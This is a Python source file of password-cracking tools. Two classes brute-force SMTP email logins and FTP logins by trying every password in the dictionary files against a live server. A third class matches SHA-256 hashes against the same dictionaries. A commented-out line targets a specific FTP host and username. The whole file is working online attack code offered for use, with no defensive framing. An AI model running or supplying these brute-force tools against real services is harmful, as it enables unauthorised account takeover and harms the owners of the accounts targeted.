import smtplib, ftplib, hashlib
import os, socket
class SMTPCrack():
    def __init__(self, email_addr, smtp_server_name):
        self.email_addr = email_addr
        self.smtp_server_name = smtp_server_name
        try:
            self.smtpserver = smtplib.SMTP(self.smtp_server_name, 587)
            self.smtpserver.ehlo()
            self.smtpserver.starttls()
            self.brute_force()
        except socket.gaierror:
            print("Unidentifiable SMTP server or user")
    def scan(self, f):
        passwfile = open(f, "r")
        for password in passwfile:
            try:
                self.smtpserver.login(self.email_addr, password)
                print("[+]Password Found: " + password)
                return True
            except smtplib.SMTPAuthenticationError:
                print("[-]Password Incorrect: " + password)
    def brute_force(self):
        files = os.listdir("passwords/")
        for f in files:
            print("\nDICTIONARY: " + f + "\n")
            if self.scan("passwords/" + f) == True:
                break
class FTPCrack():
    def __init__(self, host, username):
        self.username = username
        self.host = host
        try:
            self.ftp = ftplib.FTP(self.host)
        except socket.gaierror:
            print("Unidentifiable host or user")
        self.brute_force()
    def scan(self, f):
        passwfile = open(f, "r")
        for password in passwfile:
            try:
                ftplib.FTP(self.host, self.username, password)
                print("[+]Password Found: " + password)
                return True
            except ftplib.error_perm:
                print("[-]Password Incorrect: " + password)
    def brute_force(self):
        files = os.listdir("passwords/")
        for f in files:
            print("\nDICTIONARY: " + f + "\n")
            if self.scan("passwords/" + f) == True:
                break
# f = FTPCrack("ftp.mattnappo.com", "matt7")
class HashCrack():
    def __init__(self, h, lookup):
        self.hash = h
        self.lookup = lookup
        self.brute_force()
    def scan(self, f):
        passwfile = open(f, "r").readlines()
        for password in passwfile:
            password = password.strip()
            sha256value = sha256(password)
            if self.lookup == True:
                if self.hash == password:
                    print("[+]Keyword Found: " + password)
                    return True
            else:
                if self.hash == sha256value:
                    print("[+]Hash Found: " + password)
                    return True
                else:
                    print(sha256value)
    def brute_force(self):
        found = False
        files = os.listdir("passwords/")
        for f in files:
            print("\nDICTIONARY: " + f + "\n")
            if self.scan("passwords/" + f) == True:
                found = True
                break
        if found == False:
            if self.lookup == True:
                print("[-]Keyword Not in Dictionaries.")
            else:
                print("[-]Hash Not in Dictionaries.")
def sha256(raw):
    encoded = raw.encode("utf-8")
    hashed = hashlib.sha256(encoded).hexdigest()
    return hashed
